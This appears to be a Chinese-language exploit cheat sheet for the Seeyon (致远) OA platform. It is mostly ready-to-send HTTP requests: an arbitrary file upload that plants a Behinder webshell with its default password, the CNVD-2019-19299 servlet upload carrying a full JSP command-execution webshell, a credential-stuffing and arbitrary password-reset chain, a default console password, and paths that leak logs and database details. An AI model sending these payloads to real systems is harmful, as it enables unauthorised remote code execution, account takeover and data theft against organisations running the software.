---
title: Seeyon-OA(致远)
---

## 应用简介

用友 致远OA，协同办公平台

## 前台任意文件上传getshell

**漏洞概述**

```http
#影响版本
致远OA <A8+ 通杀
```

**漏洞利用**

```http
POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;
Content-Type: application/x-www-form-urlencoded
Content-Length: 8819

managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00
```

冰蝎3 默认马pass：rebeyond

Webshell地址：127.0.0.1/seeyon/SeeyonUpdate1.jspx

## [CNVD-2019-19299]-A8未授权代码执行

**漏洞概述**

```http
#影响范围
致远A8+协同管理软件 V7.0 SP3
致远A8+协同管理软件 V6.1 SP2
```

该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传

**漏洞利用**

1、访问`/seeyon/htmlofficeservlet`出现内容可能存在漏洞

POC如下

```http
POST /seeyon/htmlofficeservlet HTTP/1.1
Content-Length: 1111
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: 10.10.10.129
Pragma: no-cache

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language='java' import='java.util.*,java.io.*'' pageEncoding='UTF-8'%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+'\n');}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if('u14vfmu8'.equals(request.getParameter('pwd'))&&!''.equals(request.getParameter('cmd'))){out.println('<pre>'+excuteCmd(request.getParameter('cmd')) + '</pre>');}else{out.println(':-)');}%>6e4f045d4b8506bf492ada7e3390d7ce
```

然后访问shell即可

```http
http://ip:port/seeyon/test123456.jsp?pwd=u14vfmu8&cmd=cmd+/c+whoami
```

**修复建议**

升级版本

## [2015年老洞]A8-v5 任意用户密码修改

**漏洞概述**

```http
#影响范围
A8-v5
```

一是无视验证码撞库
致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试

二是任意用户密码修改
致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞

**漏洞利用**

一、无视验证码撞库，穷举用户和密码

```http
GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0
Accept: */*
Accept-Language: zh-cn
Referer: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFrame
requesttype: AJAX
Content-Type: application/x-www-form-urlencoded
Cookie: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: a8v51.seeyon.com
DNT: 1
Proxy-Connection: Keep-Alive
```

显示true为该用户密码正确，轮询P_1_String参数即可撞库

二、任意用户密码修改

在上一步完成之后，页面调转到提交修改密码请求页面

```http
POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0
Accept: text/html, application/xhtml+xml, */*
Referer: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFrame
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Content-Type: application/x-www-form-urlencoded
Proxy-Connection: Keep-Alive
Pragma: no-cache
Content-Length: 86
DNT: 1
Host: a8v51.seeyon.com
Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"
individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456
```

individualName为用户名

需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出

## A8-V5 log信息泄露

```http
seeyon/logs/login.log
seeyon/logs/ctp.log
seeyon/logs/uc.log
```

## A8-V5 未授权访问

```http
/seeyon/ctp/sysmgr/monitor/cacheDump.do
```

## A8-m企业版v3.20SP1 - 越权

```http
/seeyon/ctp/sysmgr/monitor/cacheDump.do
```

## A8-监控后台默认密码漏洞

```http
/seeyon/management/status.jsp
/seeyon/management/index.jsp
/management/index.jsp

password:WLCCYBD@SEEYON
```

## A6-数据库敏感信息泄露

```http
/createMysql.jsp
/ext/createMysql.jsp
```
